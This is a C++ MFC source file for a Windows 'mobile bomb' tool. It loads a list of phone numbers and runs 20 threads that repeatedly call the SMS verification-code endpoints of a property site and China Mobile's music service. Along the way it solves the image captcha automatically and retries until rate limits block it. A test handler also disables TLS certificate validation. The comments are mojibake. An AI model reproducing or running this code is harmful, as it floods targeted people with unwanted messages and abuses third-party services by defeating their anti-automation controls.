// MobileBombDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "MobileBomb.h"
#include "MobileBombDlg.h"
#include "CtrlFile/WebBase.h"
#include <afxinet.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CMobileBombDlg �Ի���




CMobileBombDlg::CMobileBombDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMobileBombDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	
}

void CMobileBombDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_PHONE, m_PhoneList);
}

BEGIN_MESSAGE_MAP(CMobileBombDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_START, &CMobileBombDlg::OnBnClickedBtnStart)
	ON_BN_CLICKED(IDC_BTN_IMPORT, &CMobileBombDlg::OnBnClickedBtnImport)
	ON_BN_CLICKED(IDC_BTN_STOP, &CMobileBombDlg::OnBnClickedBtnStop)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CMobileBombDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CMobileBombDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON3, &CMobileBombDlg::OnBnClickedButton3)
END_MESSAGE_MAP()


// CMobileBombDlg ��Ϣ�������

BOOL CMobileBombDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��
	m_bRunFlag = false;
	for (int i=0;i<20;i++)
	{
		m_pRumThread[i] = NULL;
	}
	InitCtrList();
	SetWindowText("�ֻ�ը��");
	m_PhoneList.MoveWindow(10,10,600,300);
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CMobileBombDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CMobileBombDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ��������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù����ʾ��
//
HCURSOR CMobileBombDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMobileBombDlg::SendMessageEx()
{
	if (!m_bRunFlag)
	{
		return;
	}
	CString strMobile = "";
	int iRet = GetSendPack(strMobile);
	if (iRet < 0)
	{
		Sleep(600);
		return;
	}
	CWebBase objWeb(50);
	string strServer = "rent.sz.soufun.com";
	string strHeader = "Content-Type: application/x-www-form-urlencoded";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	/************************************************************************/
	/* SOUFUN BEGIN                                                         */
	/************************************************************************/
	while (true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		Sleep(10);
		if (iLoopCount > 10)
		{
			strFailReason = "����ѭ������";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		CString strFormat = "";
		strFormat.Format("/rent/PostService/Phone_RangNum.aspx?action=number&mobile=%s&randstr=%d%d",strMobile,rand()%10000,GetTickCount());				
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		CString strRet = CString(objWeb.GetContentInfo());
		if (strRet.Find("\"�ɹ�\"") >=0 )
		{
			AddSendResult(strMobile,true,"");
		}
		else if (strRet.Find("ÿ���ֻ��ŵ���ֻ������3��") >= 0)
		{			
			strFailReason = "ÿ���ֻ��ŵ���ֻ������3��";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
	}
	iLoopCount = 0;
	/************************************************************************/
	/* SOUFUN END                                                           */
	/************************************************************************/	
	MobileMusicSend(strMobile);
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::AddSendResult(CString strPhone,bool bSuc,CString strResult)
{
	map<CString,int>::iterator it = m_mapPhoneList.find(strPhone);
	if (it == m_mapPhoneList.end())
	{
		return;
	}
	int iItemNum = it->second;
	
	CString strFailNum = m_PhoneList.GetItemText(iItemNum,3);
	m_PhoneList.SetItemText( iItemNum , 1, CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S"));	
	if (bSuc)
	{
		CString strSucNum = m_PhoneList.GetItemText(iItemNum,2);
		strSucNum.Format("%d",atoi(strSucNum)+1);
		m_PhoneList.SetItemText( iItemNum , 2, strSucNum );
	}
	else
	{
		CString strFailNum = m_PhoneList.GetItemText(iItemNum,3);
		strFailNum.Format("%d",atoi(strFailNum)+1);
		m_PhoneList.SetItemText( iItemNum , 3, strFailNum );
		m_PhoneList.SetItemText( iItemNum , 4, strResult );
	}
}

void CMobileBombDlg::MobileMusicSend(CString strMobile)
{
	CWebBase objWeb(50);
	objWeb.SetNoCookie(true);
	string strServer = "mdll.10086.cn";
	string strHeader = "x-flash-version: 10,1,102,64";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	
	srand(time(NULL));

	string strFilePath = objWeb.GetAppPath();
	char szFileName[100] = {0};
	sprintf(szFileName,"pic%d.bmp",GetCurrentThreadId());
	strFilePath.append(szFileName);
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	/************************************************************************/
	/* SOUFUN BEGIN                                                         */
	/************************************************************************/
	while (true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		Sleep(10);
		if (iLoopCount > 10)
		{
			strFailReason = "����ѭ������";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		CString strFormat = "";
		strFormat.Format("/newweb/jsp/common/validatecodeFlash.jsp?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);				
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,true,strFilePath.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		//�Ѿ��õ���֤��
		CCodeCheck objCheck;
		string strRetCode = objCheck.CheckCode(strFilePath);
		//��֤���Ѿ��õ�
		if (strRetCode.length() != 4)
		{
			continue;
		}
		string strHeaderEx = strHeader;
		strHeaderEx.append("\r\nCookie:"+objWeb.GetCookie());
		strFormat.Format("/newweb/jsp/ordertone/getvalidate.jsp?jsonString={\"mobile\":\"%s\",\"salesid\":\"0\",\"singid\":\"0\",\"imgpass\":\"%s\"}",strMobile,strRetCode.c_str());
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str());
		if (iRet < 0)
		{
			iLoopCount++;
			continue;
		}
		
		CString strRet = CString(objWeb.GetContentInfo());
		ConvertUtf8ToGBK(strRet);

		if (strRet.Find("\"�·���֤��ɹ�\"") >=0 )
		{
			AddSendResult(strMobile,true,"");
			int i=0;
			while(m_bRunFlag && i++<121)
				Sleep(500);	
		}
		else if (strRet.Find("�𾴵��û�,����ö�����֤���Ƶ�ʹ���,��1���Ӻ�����,лл") >= 0)
		{
			strFailReason = "��֤���Ƶ�ʹ���";
			AddSendResult(strMobile,false,strFailReason);  
			int i=0;
			while(m_bRunFlag && i++<121)
				Sleep(500);			
		}
		else if(strRet.Find("�𾴵��û�,����ö�����֤����ܴ����Ѿ�����20������,���Ժ�����,лл") >= 0)
		{
			strFailReason = "�Ѿ�����20������";
			AddSendResult(strMobile,false,strFailReason);
			break;
		}
		else
		{
			AddSendResult(strMobile,false,strRet.Left(30));
		}
		//break;
	}
	iLoopCount = 0;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::OnBnClickedBtnStart()
{
	if (m_bRunFlag)
	{
		return;
	}
	m_bRunFlag = true;
	for (int i=0;i<20;i++)
	{
		m_pRumThread[i] = AfxBeginThread((AFX_THREADPROC)RunThreadProc, (LPVOID)this);
	}
	
	GetDlgItem(IDC_BTN_START)->EnableWindow(FALSE);
	GetDlgItem(IDC_BTN_STOP)->EnableWindow(TRUE);
}

void CMobileBombDlg::InitCtrList()
{
	DWORD dwSytle=::GetWindowLong(m_PhoneList.m_hWnd,GWL_STYLE);
	//����Ϊ������ʽ
	SetWindowLong(m_PhoneList.m_hWnd,GWL_STYLE,dwSytle|LVS_REPORT);
	DWORD ExStyle=m_PhoneList.GetExtendedStyle();
	m_PhoneList.SetExtendedStyle(ExStyle|LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
	::SendMessage(m_PhoneList.m_hWnd, LVM_SETEXTENDEDLISTVIEWSTYLE,
		LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);
	m_PhoneList.InsertColumn(0,_T("�ֻ�����"),LVCFMT_LEFT,100);
	m_PhoneList.InsertColumn(1,_T("����ʱ��"),LVCFMT_LEFT,150);
	m_PhoneList.InsertColumn(2,_T("�ɹ�����"),LVCFMT_LEFT,60);
	m_PhoneList.InsertColumn(3,_T("ʧ�ܴ���"),LVCFMT_LEFT,60);
	m_PhoneList.InsertColumn(4,_T("ʧ��ԭ��"),LVCFMT_LEFT,200);
}

void CMobileBombDlg::OnBnClickedBtnImport()
{
	char szFilter[255] = {0};
	CString strPath = "";
	strcpy(szFilter,"Text files(*.txt)|*.txt");
	CFileDialog dlg(1,NULL,NULL,NULL,szFilter); 
	if(dlg.DoModal()==IDOK) 
	{
		strPath = dlg.GetPathName();
	}
	strPath.Trim();
	if (strPath == "")
	{
		return;
	}
	CStdioFile   file;
	CString   cstr = "";
	CFileException   fe;
	int iNum = 0;
	if(file.Open(strPath,CFile::modeRead,&fe))   
	{
		file.SeekToBegin();
		m_mapPhoneList.clear();
		m_PhoneList.DeleteAllItems();
		while (file.ReadString(cstr))
		{
			cstr.Trim();
			if (cstr != "")
			{
				int nCount = m_PhoneList.GetItemCount();
				map<CString,int>::iterator it = m_mapPhoneList.find(cstr);
				if (it != m_mapPhoneList.end())
				{
					continue;
				}
				m_mapPhoneList[cstr] = nCount;
				m_SendList.Add(cstr);
				m_PhoneList.InsertItem( nCount,cstr);
				m_PhoneList.SetItemText(nCount,2,"0");
				m_PhoneList.SetItemText(nCount,3,"0");
			}				
		}
	}
}

/************************************************************************/
/*                                                                      */
/************************************************************************/
//�̺߳���
void CMobileBombDlg::RunThreadProc(LPVOID lpParam)
{
	CMobileBombDlg *pThis = (CMobileBombDlg *)lpParam;
	pThis->RunProc(); 
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//�߳�ִ�к���
void CMobileBombDlg::RunProc()
{
	while(true)
	{
		if (!m_bRunFlag)
		{
			return;
		}
		SendMessageEx();
	}
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
void CMobileBombDlg::OnBnClickedBtnStop()
{
	m_bRunFlag = false;
	for (int i=0;i<20;i++)
	{
		if (m_pRumThread[i] == NULL)
		{
			continue;
		}
		DWORD dRet = ::WaitForSingleObject(m_pRumThread[i]->m_hThread,5000);
		if (dRet == WAIT_TIMEOUT)
		{
			::TerminateThread(m_pRumThread[i]->m_hThread,0);
		}
	}	
	GetDlgItem(IDC_BTN_START)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_STOP)->EnableWindow(FALSE);
}

void CMobileBombDlg::OnClose()
{
	OnBnClickedBtnStop();
	CDialog::OnClose();
}


/************************************************************************/
/*                                                                      */
/************************************************************************/
//��ӵȴ����ͻ�������
void CMobileBombDlg::AddRealSendPack(CString &sendPack)
{
	m_SendLock.Lock();
	try
	{		
		m_SendList.Add(sendPack);
	}
	catch(...)
	{
		
	}
	m_SendLock.Unlock();
	return;
}
/************************************************************************/
/*                                                                      */
/************************************************************************/
//��ȡ�ȴ�������Ϣ���з���
int CMobileBombDlg::GetSendPack(CString &sendPack)
{
	int iRet = 0;
	m_SendLock.Lock();
	try
	{		
		int iSize = m_SendList.GetSize();
		if (iSize == 0)	//������������
		{
			iRet = -1;
		}
		else
		{
			sendPack = m_SendList.GetAt( 0 );
			m_SendList.RemoveAt( 0 );
			iRet = 0;	//������ȡ������
		}		
	}
	catch(...)
	{
		iRet = -2;		//����
	}
	m_SendLock.Unlock();
	return iRet;
}
void CMobileBombDlg::OnBnClickedButton1()
{
	m_bRunFlag = true;
	//MobileMusicSend("15019212360");return;
	CWebBase objWeb(50);
	for (int i=0;i<1;i++)
	{
		char szPath[260] = {0};
		sprintf(szPath,"E:\\MobileBomb\\MobileBomb\\out\\pic300.bmp",i);
		CCodeCheck objCheck;
		string sstrRet = objCheck.CheckCode(string(szPath));
		AfxMessageBox(sstrRet.c_str());
	}
	
	
	return;
	
	string strServer = "mdll.10086.cn";
	string strHeader = "x-flash-version: 10,1,102,64";
	strHeader.append("\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 1.1.4322)");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	CString strFormat = "";
	strFormat.Format("/newweb/jsp/common/validatecodeFlash.jsp?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);				
	iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,true,"c:\\test.bmp");
	if (iRet < 0)
	{
		return;
	}
	CString strRet = CString(objWeb.GetContentInfo());
	if (strRet.Find("\"�ɹ�\"") >=0 )
	{
		AddSendResult("",true,"");
	}
	else if (strRet.Find("ÿ���ֻ��ŵ���ֻ������3��") >= 0)
	{			
		strFailReason = "ÿ���ֻ��ŵ���ֻ������3��";
		AddSendResult("",false,strFailReason);
	}
}

void CMobileBombDlg::ConvertUtf8ToGBK(CString& strUtf8) 
{
	int len = 0;
	unsigned short * wszGBK = NULL;
	char * szGBKt = NULL;
	char * szGBKs = NULL;

	len = MultiByteToWideChar(CP_UTF8, 0, (LPCTSTR)strUtf8, -1, NULL,0);
	wszGBK = new unsigned short[len+1];
	memset(wszGBK, 0, len * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, (LPCTSTR)strUtf8, -1, (LPWSTR)wszGBK, len);

	len = WideCharToMultiByte(CP_ACP, 0, (LPWSTR)wszGBK, -1, NULL, 0, NULL, NULL); 
	szGBKt  =new char[len + 1];
	memset(szGBKt, 0, len + 1);
	WideCharToMultiByte (CP_ACP, 0, (LPWSTR)wszGBK, -1, szGBKt, len, NULL,NULL);

	szGBKs  =new char[len + 1];
	memset(szGBKs, 0, len + 1);
	//ת��Gb�뷱�嵽Gb����壬ʹ��API����LCMapString 
	LCMapString( 0x0804, LCMAP_SIMPLIFIED_CHINESE, szGBKt, -1, szGBKs, len);
	strUtf8 = szGBKs;
	delete[] szGBKs;
	delete[] szGBKt;
	delete[] wszGBK;
}
void CMobileBombDlg::OnBnClickedButton2()
{
	A a[10];
	int ii = sizeof(a);
}

void CMobileBombDlg::OnBnClickedButton3()
{
	

	//return;
	CWebBase objWeb(50);
	objWeb.SetHttpType(0);

	CInternetSession session;

	CHttpConnection* pConnection = session.GetHttpConnection("web1800jrl", INTERNET_FLAG_NO_AUTO_REDIRECT,
		443, NULL, NULL);


	CHttpFile *pHttpFile = NULL;
// 	DWORD dwFlagsEx;
// 	DWORD dwBuffLen = sizeof(hRequest);
// 	InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
// 	dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
// 	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx) );

	pHttpFile = pConnection->OpenRequest(_T("GET"), "/Web1800v2/Status.asmx", NULL, 1, NULL, NULL,
			INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD |
			INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_TRANSFER_ASCII | INTERNET_FLAG_SECURE |
			SECURITY_IGNORE_ERROR_MASK);
		//add by shaojun at 2010-09-07 ��ָ��Ƿ�ʱ���˳�			
		if (pHttpFile == NULL)
		{
			return ;
		}
		//HINTERNET hRequest = pHttpFile->
		
		DWORD dwFlagsEx;
		DWORD dwBuffLen = sizeof(dwFlagsEx);
		/*InternetQueryOptionA(pHttpFile->m_hFile, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
		dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
		InternetSetOptionA(pHttpFile->m_hFile, INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx) );*/
		pHttpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlagsEx, &dwBuffLen);
		dwFlagsEx |= SECURITY_IGNORE_ERROR_MASK;
		pHttpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, &dwFlagsEx, sizeof(dwFlagsEx));
		// /Web1800v2/Status.asmx
		CString strRequest = "/Web1800v2/Status.asmx";
		pHttpFile->SendRequest(NULL, 0, (LPVOID)(LPCTSTR)"", 0);

		DWORD dwStatusCode = HTTP_STATUS_OK;
		pHttpFile->QueryInfoStatusCode(dwStatusCode);

		// strResponse
		if (dwStatusCode == HTTP_STATUS_OK)
		{
			if (HTTP_STATUS_OK == dwStatusCode)
			{
				CString strBuf = _T("");
				CString strResponse = _T("");
				while (pHttpFile->ReadString(strBuf))
				{
					strResponse += strBuf + "\r\n";
				}
				strResponse = strResponse.Left(strResponse.GetLength() - 2);
			}
		}

//	CHttpFile* pHttpFile = NULL;
	DWORD dwFlags = 0;
	dwFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_RELOAD;
	
	dwFlags = dwFlags |
		INTERNET_FLAG_SECURE |
		SECURITY_IGNORE_ERROR_MASK ;
	pHttpFile = (CHttpFile* )session.OpenURL("https://web1800jrl/Web1800v2/Status.asmx", 1, INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD |
		INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_TRANSFER_ASCII | INTERNET_FLAG_SECURE |
		SECURITY_IGNORE_ERROR_MASK);
//	DWORD dwStatusCode = HTTP_STATUS_OK;
	pHttpFile->QueryInfoStatusCode(dwStatusCode);

	if (HTTP_STATUS_OK == dwStatusCode)
	{
		CString strBuf = _T("");
		CString strResponse = _T("");
		while (pHttpFile->ReadString(strBuf))
		{
			strResponse += strBuf + "\r\n";
		}
		strResponse = strResponse.Left(strResponse.GetLength() - 2);
	}


	return;
	//https://mybank.icbc.com.cn/icbc/perbank/index.jsp
	string strServer = "web1800jrl";
	//strServer = "mybank.icbc.com.cn";
	string strHeader = "";
	strHeader.append("User-Agent:Web1800");
	strHeader.append("\r\nAccept: */*");
	strHeader.append("\r\nConnection: Keep-Alive");
	srand(time(NULL));
	int iRet  = -1;
	int iLoopCount = 0;
	CString strFailReason = "";
	CString strFormat = "";
	strFormat.Format("/Web1800v2/Status.asmx?0.%d%d%d",rand()%10000,GetTickCount(),rand()%1000);	
	//strFormat = "/icbc/perbank/index.jsp";
	//iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,false,"");
	int iHttpsType = ((CButton*)GetDlgItem(IDC_CHECK1))->GetCheck();
	if (iHttpsType == 1)
	{
		objWeb.SetHttpType(0);
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),443,false,"");
		CString strError = CString(objWeb.GetLastErrorInfo());
	}
	else
	{
		objWeb.SetHttpType(1);
		iRet = objWeb.GetPage(strFormat,strHeader.c_str(),strServer.c_str(),80,false,"");
	}	
	if (iRet < 0)
	{
		return;
	}
	CString strRet = CString(objWeb.GetContentInfo());
	
}

